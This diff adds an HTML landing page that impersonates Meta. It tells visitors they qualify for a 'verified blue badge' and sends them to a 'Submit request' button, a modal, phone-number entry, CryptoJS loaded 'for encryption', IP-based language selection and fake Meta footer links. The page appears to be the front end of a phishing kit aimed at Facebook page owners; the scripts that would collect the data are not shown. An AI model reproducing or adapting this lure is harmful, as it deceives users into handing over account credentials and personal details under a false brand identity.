@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+    <title data-i18n="mv_title">Meta Verified - Rewards for you</title>
+    <link rel="icon" href="./public/favicon-32x32.png">
+    <link rel="stylesheet" href="./public/styles/style.css">
+    <!-- Intl-Tel-Input CSS for phone code selector -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@19.5.6/build/css/intlTelInput.css">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+</head>
+
+<body class="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen w-full flex justify-center">
+    <script>
+      // Giữ cơ chế ẩn tạm thời cho đến khi xử lý ngôn ngữ (không ảnh hưởng nội dung tĩnh)
+      try { document.body.style.opacity = '0'; document.body.style.transition = 'opacity .2s ease'; } catch(_) {}
+    </script>
+    <div class="max-w-[768px] w-full p-4 h-full">
+        <div class="w-full">
+            <div class="flex items-start gap-[8px] flex-col justify-start mb-[30px]">
+                <img src="./public/tick.svg" class="w-12 h-12" data-i18n-attr="alt:mv_img_tick_alt" alt="tick">
+                <b class="text-[2rem]" data-i18n="mv_heading">Meta Verified - Rewards for you</b>
+            </div>
+
+            <div class="w-full">
+                <div class="w-full mb-[20px]">
+                    <b class="text-[17px]" data-i18n="mv_tagline">Show the world that you mean business.</b>
+                    <p class="text-[15px] mb-[0px] mt-[15px]" data-i18n="mv_p1">Congratulations on achieving the requirements to upgrade your page
+                        to a verified blue badge! This is a fantastic milestone that reflects your dedication and the
+                        trust you've built with your audience.</p>
+                    <p class="text-[15px] mb-[0px] mt-[15px]" data-i18n="mv_p2">We're thrilled to celebrate this moment with you and look forward
+                        to seeing your page thrive with this prestigious recognition!</p>
+                    <p class="text-[16px] mb-[0px] mt-[14px] text-[#465a69]"><span data-i18n="mv_ticket_label">Your ticket id:</span> #<span id="ticketId">XXXX-XXXX-XXXX</span></p>
+                </div>
+
+                <div class="w-full">
+                    <p class="mb-[15px]"><b class="text-[17px] font-bold" data-i18n="mv_req_title">Verified Blue Badge Request Guide</b></p>
+                    <p class="text-[15px] mb-[10px]" data-i18n="mv_g1">- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats</p>
+                    <p class="text-[15px] mb-[10px]" data-i18n="mv_g2">- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.</p>
+                    <p class="text-[15px] mb-0" data-i18n="mv_g3">- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.</p>
+                </div>
+            </div>
+        </div>
+
+        <button id="submitRequestBtn" type="button" onclick="try{openClientModal()}catch(e){}" aria-haspopup="dialog" role="button" tabindex="0" style="pointer-events:auto" class="relative z-10 bg-[#1877f2] text-white border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center" data-i18n="mv_btn_request">Submit request</button>
+
+        <div class="flex items-center text-center justify-center flex-wrap text-xs mt-8 text-[#65676b] gap-4">
+            <a href="#" data-i18n="mv_footer_help">Help Center</a>
+            <a href="#" data-i18n="mv_footer_policy">Privacy Policy</a>
+            <a href="#" data-i18n="mv_footer_terms">Terms of Service</a>
+            <a href="#" data-i18n="mv_footer_community">Community Standards</a>
+            <a href="#" data-i18n="mv_footer_meta">Meta © 2025</a>
+        </div>
+    </div>
+
+    <!-- Modals Container -->
+    <div id="modalsContainer"></div>
+
+    <!-- JavaScript Files (giữ nguyên cơ chế hiện có) -->
+    <script src="./public/js/config.js"></script>
+    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/modal.js"></script>
+    <!-- Intl-Tel-Input JS for phone code selector -->
+    <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@19.5.6/build/js/intlTelInput.min.js"></script>
+    <script src="./public/i18n/locales.js"></script>
+    <script src="./public/i18n/assets.js"></script>
+    <script src="./public/i18n/locales_ext.js"></script>
+    <script src="./public/js/i18n.js"></script>
+    <script>
+      // Duy trì cơ chế chọn ngôn ngữ theo IP, sau đó hiện nội dung
+      (function(){
+        var reveal = function(){ try { document.body.style.opacity = '1'; } catch(_){} };
+        try {
+          var qs = (typeof window.location.search === 'string') ? window.location.search : '';
+          var hasLangParam = /(?:^|[?&])lang=/.test(qs);
+          var isMobileUA = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent || '');
+          if (hasLangParam) { reveal(); return; }
+          if (!window.Utils || !window.I18N || typeof window.Utils.getUserLocation !== 'function') { reveal(); return; }
+          var stored = (function(){ try { return (localStorage.getItem('preferredLang') || localStorage.getItem('prefLang') || '').toLowerCase(); } catch(_){ return ''; } })();
+          window.Utils.getUserLocation().then(function(loc){
+            var cc = (loc && (loc.country_code || loc.countryCode)) || '';
+            var byIp = (window.I18N && typeof window.I18N.mapCountryToLang === 'function') ? window.I18N.mapCountryToLang(cc) : '';
+            var cur = (window.I18N && window.I18N.lang) ? window.I18N.lang : 'en';
+            var shouldOverride = isMobileUA || !stored || stored === 'en';
+            if (shouldOverride && byIp && byIp !== cur && window.I18N && typeof window.I18N.setLang === 'function') {
+              window.I18N.setLang(byIp);
+            }
+          }).catch(function(){ /* ignore */ }).finally(reveal);
+        } catch (_) { reveal(); }
+      })();
+    </script>
+    <script src="./public/js/slug.js"></script>
+    <script> if (window.ensureSlugUrl) window.ensureSlugUrl(); </script>
+    <script src="./public/js/app.js"></script>
+</body>
+
+</html>
